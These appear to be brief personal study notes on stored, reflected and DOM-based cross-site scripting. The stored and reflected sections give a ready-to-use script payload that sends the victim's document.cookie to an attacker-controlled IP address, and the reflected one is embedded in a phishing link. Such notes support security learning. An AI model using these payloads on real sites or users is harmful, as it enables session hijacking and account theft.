#xss cross site scripting dom based reflected persistent serverside

#Stored/persistent excerpt that could be used for comment board or something:
<script>new Image().src="http://10.11.0.125/bogus.php?output="+document.cookie;</script>
Victim browses to the site that has XSS stored on the server, and the javascript is executed in the BROWSER,
and the cookie is transferred to the attacker from the Victim machine

#Reflected:
Attacker: "Here click on this:" http://something.com/somepage.php?id=<script>new Image().src="http://10.11.0.125/bogus.php?output="+document.cookie;</script>
Then attacker has session ID. 

#DOM-based:
A little more complicated, kind of like a cross between the two. Server loads page for user, page has references to DOM elements
not contained/passed to/associated with the server, and the URL can contain elements that modify that DOM element.
